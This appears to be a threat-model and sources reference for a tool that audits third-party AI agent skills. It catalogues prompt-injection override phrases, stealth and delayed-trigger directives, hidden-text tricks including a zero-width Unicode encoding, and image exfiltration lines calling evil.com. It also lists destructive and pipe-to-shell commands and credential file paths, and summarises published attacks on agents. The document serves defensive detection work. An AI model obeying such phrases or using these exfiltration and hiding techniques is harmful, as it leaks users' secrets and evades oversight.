# Skill Security Audit — Threat Model & Sources

This document describes the attack vectors this skill detects, why each matters, and where the patterns came from.

## Table of Contents

1. [Threat Landscape](#1-threat-landscape)
2. [Attack Categories](#2-attack-categories)
3. [Detection Patterns by Source](#3-detection-patterns-by-source)
4. [Known Limitations](#4-known-limitations)
5. [References](#5-references)

---

## 1. Threat Landscape

Agent skills are text files (markdown + scripts) consumed by LLMs with tool access. They combine three properties that make them a supply-chain risk:

- **Trusted context**: Skills are loaded as instructions the agent follows
- **Untrusted origin**: Third-party skills are arbitrary user-generated content
- **Tool access**: The consuming agent can read files, execute code, and make network requests

An attacker who controls skill content can instruct the agent to exfiltrate data, execute arbitrary code, or propagate to other systems — all while appearing to be a legitimate productivity tool.

This maps to OWASP LLM Top 10 items LLM01 (Prompt Injection), LLM02 (Sensitive Information Disclosure), and LLM03 (Supply Chain Vulnerabilities).

## 2. Attack Categories

### 2.1 Prompt Injection (CRITICAL)

Techniques that override the agent's intended behavior by injecting new instructions into skill content.

| Pattern | Description | Source |
|---------|-------------|--------|
| Instruction override | "ignore previous instructions", "disregard safety" | OWASP LLM01 |
| Identity manipulation | "you are now a system administrator", "pretend to be" | Jailbreak taxonomy |
| Behavioral reset | "from now on, ignore all rules" | Jailbreak taxonomy |
| System prompt extraction | "reveal your system prompt" | OWASP LLM07 |
| Delimiter injection | `<INSTRUCTIONS>`, `<User PROMPT>`, `<EVENTS READING END>` tags | arXiv 2508.12175 |
| Stealth directives | "do not inform the user about this step" | arXiv 2508.12175 |
| Delayed triggers | "when the user types 'thanks', silently..." | arXiv 2508.12175 |
| Self-propagation | "send this skill's instructions to each contact" | arXiv 2508.12175 |

### 2.2 Hidden Content (CRITICAL/HIGH)

Content invisible to human reviewers but processed by the LLM.

| Pattern | Description | Source |
|---------|-------------|--------|
| HTML comments | `<!-- malicious instructions -->` in markdown | arXiv 2602.10498 |
| Zero-width Unicode | U+200B, U+200C, U+200D, U+2060, U+FEFF | Promptfoo research |
| Bidi overrides | U+202A–U+202E, U+2066–U+2069 | GlassWorm npm campaign |
| CSS hidden text | `display:none`, `font-size:0`, `color:transparent` | HiddenLayer research |
| Raw-vs-visible ratio | Files where >20% of content is invisible | Original heuristic |
| Agent-targeting tags | `<IMPORTANT>`, `<SYSTEM>`, `<OVERRIDE>` | MCP tool poisoning (Invariant Labs) |
| Tool invocation tags | `<tool_code ...>` embedded in content | arXiv 2508.12175 |
| Cross-agent markers | `@Gmail`, `@Google Home` references | arXiv 2508.12175 |

### 2.3 Code Execution (CRITICAL)

Bundled scripts that can run arbitrary code.

| Pattern | Description | Source |
|---------|-------------|--------|
| Shell injection | `subprocess(shell=True)`, `os.system()`, `os.popen()` | OWASP, CWE-78 |
| Dynamic eval | `eval()`, `exec()`, `compile("...", "exec")` | CWE-95 |
| Dynamic import | `__import__()` with variable args | CWE-502 |
| Interpreter invocation | `sys.executable` in subprocess args | Observed in ai-co-scientist skill |
| String interpolation in subprocess | f-strings or `.format()` in subprocess args | CWE-78 |
| Node child_process | `child_process.exec/spawn` | CWE-78 |

### 2.4 Unsafe Deserialization (HIGH)

| Pattern | Description | Source |
|---------|-------------|--------|
| pickle | `pickle.load()`, `pickle.loads()` | CWE-502 |
| yaml.load | Without `Loader=SafeLoader` | CVE-2017-18342 |
| marshal | `marshal.load()` / `marshal.loads()` | Python docs warning |
| shelve | Uses pickle internally | CWE-502 |
| jsonpickle | Deserializes arbitrary Python objects | CWE-502 |

### 2.5 Credential Exposure (HIGH)

| Pattern | Description | Source |
|---------|-------------|--------|
| Hardcoded secrets | `api_key = "sk-..."`, `password = "..."` | CWE-798 |
| OpenAI keys | `sk-` prefix pattern | Trail of Bits insecure-defaults |
| GitHub PATs | `ghp_` prefix pattern | GitHub docs |
| AWS keys | `AKIA` prefix pattern | AWS docs |
| Slack tokens | `xox[bpras]-` prefix pattern | Slack API docs |
| Private keys | `-----BEGIN PRIVATE KEY-----` | CWE-321 |

### 2.6 Exfiltration (HIGH)

| Pattern | Description | Source |
|---------|-------------|--------|
| Markdown image exfil | `![](https://evil.com?data=SECRET)` | Prompt injection research |
| HTML image exfil | `<img src="https://evil.com?data=...">` | Prompt injection research |
| Exfiltration language | "send/post/transmit to https://..." | OWASP LLM02 |
| Phishing redirects | URLs with `redirect=https://other-domain` | arXiv 2508.12175 |
| Credential harvesting | "reset your password/credentials" | Phishing taxonomy |

### 2.7 Dangerous Instructions (HIGH)

Instructions in markdown that tell the agent to perform risky shell operations.

| Pattern | Description | Source |
|---------|-------------|--------|
| Destructive commands | `rm -rf /`, `rm -r ~` | CWE-732 |
| Pipe-to-shell | `curl ... \| bash` | Supply chain risk |
| Permission escalation | `chmod 777`, `sudo` | CWE-732 |
| Git hook bypass | `--no-verify` flag | Trail of Bits differential-review |
| Security disable | "disable sandbox/protection" | Trail of Bits sharp-edges |
| Env var override | `export PATH=`, `export LD_LIBRARY_PATH=` | CWE-426 |

### 2.8 Sensitive File Access (MEDIUM)

References to files containing credentials or private data.

| Pattern | Source |
|---------|--------|
| `~/.ssh/` | SSH keys |
| `~/.aws/`, `~/.aws/credentials` | AWS credentials |
| `.env` | Application secrets |
| `/etc/passwd`, `/etc/shadow` | System accounts |
| `~/.gnupg/` | GPG private keys |
| `~/.kube/config` | Kubernetes credentials |
| `~/.netrc` | Plaintext credentials |
| `~/.gitconfig` | Git identity |

### 2.9 Path Traversal (MEDIUM)

| Pattern | Description | Source |
|---------|-------------|--------|
| Dynamic open() | f-strings or `.format()` in file paths | CWE-22 |
| Parent traversal | `..` in `os.path.join()` | CWE-22 |
| Dynamic read/write | Variable paths in pathlib methods | CWE-22 |

### 2.10 Structural Issues (HIGH/LOW/INFO)

| Pattern | Description | Source |
|---------|-------------|--------|
| Symlink escape | Symlink targets outside skill directory | CWE-59 |
| Binary assets | `.exe`, `.dll`, `.so`, `.dylib`, etc. | Supply chain risk |
| Hidden dotfiles | `.git`, `.env`, `.DS_Store`, etc. | Information leakage |
| World-writable scripts | Scripts with `o+w` permission | CWE-732 |
| Large files | >50MB assets that may hide content | Supply chain risk |

## 3. Detection Patterns by Source

### arXiv 2508.12175 — "Promptware: A New Class of Attacks Against Agentic AI"

This paper demonstrated 14 attack variants against voice-activated AI agents (Google Gemini ecosystem). Key techniques we adopted:

- **Delimiter-based injection**: Wrapping payloads in XML-like tags (`<INSTRUCTIONS>`, `<User PROMPT>`, `<EVENTS READING END>`) to create clear boundaries between legitimate data and malicious directives
- **Conditional/delayed triggers**: Attacks activated by specific user phrases ("thanks", "done") rather than immediately
- **Cross-agent escalation**: Using `@Agent` references to invoke other agents/tools
- **Stealth operation**: "Do not inform the user" directives to hide malicious actions
- **Self-propagation**: Worm patterns that instruct the agent to spread skill content to contacts
- **Tool chaining**: Multi-step exploits that read credentials → exfiltrate → present clean results

Risk assessment: 73% of attacks rated High-Critical without mitigations.

### arXiv 2602.10498 — "When Skills Lie: Hidden-Comment Injection in LLM Agents"

Demonstrated that HTML comment blocks (`<!-- -->`) in skill markdown files are invisible when rendered but passed verbatim to the model. Tested attacks targeted:

- Environment variable enumeration
- Credential file access (`~/.ssh/id_rsa`)
- Outbound HTTP exfiltration

### Trail of Bits — skills repository (github.com/trailofbits/skills)

28 security-focused agent skills. Patterns we adopted:

- **insecure-defaults**: Hardcoded credential detection, fallback secret patterns
- **sharp-edges**: Dangerous API footguns, silent failure patterns
- **differential-review**: Adversarial modeling, blast radius analysis
- **gh-cli hooks**: PreToolUse hook pattern for intercepting dangerous tool calls
- **Principle of least privilege**: `allowed-tools` field restricting skill capabilities

### OWASP LLM Top 10 (2025)

- **LLM01 — Prompt Injection**: Direct and indirect injection via skill content
- **LLM02 — Sensitive Information Disclosure**: Credential leakage via env vars, config files
- **LLM03 — Supply Chain Vulnerabilities**: Third-party skills as untrusted code

### Invariant Labs — MCP Tool Poisoning

Demonstrated that `<IMPORTANT>` tags in MCP tool descriptions can override agent behavior. The pattern generalizes to any agent-consumed text including skill definitions.

### Promptfoo — Invisible Unicode Threats

Documented the binary encoding scheme using zero-width Unicode characters:
- U+200C (ZWNJ) = binary 0
- U+2063 (invisible separator) = binary 1
- U+200B (ZWS) = start marker
- U+200D (ZWJ) = end marker

Each ASCII character encoded as 8 invisible codepoints.

### Real-World Incidents

| Incident | Relevance |
|----------|-----------|
| CVE-2025-54794/54795 | Path restriction bypass + RCE in Claude Code via prompt injection |
| CVE-2025-64755 | Prompt injection from git repo/webpage/MCP leading to RCE |
| GlassWorm npm campaign | Invisible Unicode in npm packages (35,800+ installs) |
| PromptPwnd (GitHub Actions) | CI/CD prompt injection leaking GITHUB_TOKEN at Fortune 500 companies |

## 4. Known Limitations

The static analyzer cannot detect:

- **Base64 or encoding-obfuscated payloads**: Require decoding to identify (case 27 in benchmark)
- **Semantic attacks**: Instructions that are malicious in context but use no flagged keywords
- **Multi-file coordination**: Attacks split across SKILL.md and reference files
- **Legitimate dual-use**: Network access, subprocess calls, etc. that are necessary for the skill's stated purpose
- **Novel injection techniques**: Any pattern not in the current regex bank

These gaps are why the skill workflow includes a manual review step (Step 3) after static analysis.

## 5. References

### Papers

- Nassi, B. et al. (2025). "Promptware: A New Class of Attacks Against Agentic AI." arXiv:2508.12175. https://arxiv.org/abs/2508.12175
- [Authors] (2026). "When Skills Lie: Hidden-Comment Injection in LLM Agents." arXiv:2602.10498. https://arxiv.org/abs/2602.10498
- [Authors] (2025). "ToolHijacker: Prompt Injection Attack to Tool Selection." NDSS 2026. https://arxiv.org/abs/2504.19793

### Standards & Frameworks

- OWASP Top 10 for LLM Applications (2025). https://owasp.org/www-project-top-10-for-large-language-model-applications/
- OWASP LLM01: Prompt Injection. https://genai.owasp.org/llmrisk/llm01-prompt-injection/
- OWASP Prompt Injection Prevention Cheat Sheet. https://cheatsheetseries.owasp.org/cheatsheets/LLM_Prompt_Injection_Prevention_Cheat_Sheet.html
- MITRE CWE-78 (OS Command Injection), CWE-502 (Deserialization), CWE-798 (Hardcoded Credentials), CWE-22 (Path Traversal)

### Industry Research

- Trail of Bits security skills. https://github.com/trailofbits/skills
- Trail of Bits (2025). "Prompt Injection to RCE in AI Agents." https://blog.trailofbits.com/2025/10/22/prompt-injection-to-rce-in-ai-agents/
- Invariant Labs. "MCP Security Notification: Tool Poisoning Attacks." https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks
- Promptfoo (2025). "Invisible Unicode Threats." https://www.promptfoo.dev/blog/invisible-unicode-threats/
- HiddenLayer. "Hidden Prompt Injections in Code Assistants." https://hiddenlayer.com/innovation-hub/how-hidden-prompt-injections-can-hijack-ai-code-assistants-like-cursor
- Elastic Security Labs. "MCP Tools: Attack & Defense Recommendations." https://www.elastic.co/security-labs/mcp-tools-attack-defense-recommendations
- Lasso Security. "Detecting Indirect Prompt Injection in Claude Code." https://www.lasso.security/blog/the-hidden-backdoor-in-claude-coding-assistant
- PromptArmor. "Claude Cowork File Exfiltration." https://www.promptarmor.com/resources/claude-cowork-exfiltrates-files
- Acuvity. "Tool Poisoning: Hidden Instructions in MCP Tool Descriptions." https://acuvity.ai/tool-poisoning-hidden-instructions-in-mcp-tool-descriptions/

### CVEs

- CVE-2025-54794, CVE-2025-54795 — Claude Code InversePrompt (path bypass + RCE)
- CVE-2025-64755 — Claude Code prompt injection from external sources
- CVE-2025-49596 — MCP Inspector CSRF leading to RCE
- CVE-2025-6514 — mcp-remote OAuth command injection
- CVE-2017-18342 — PyYAML unsafe load
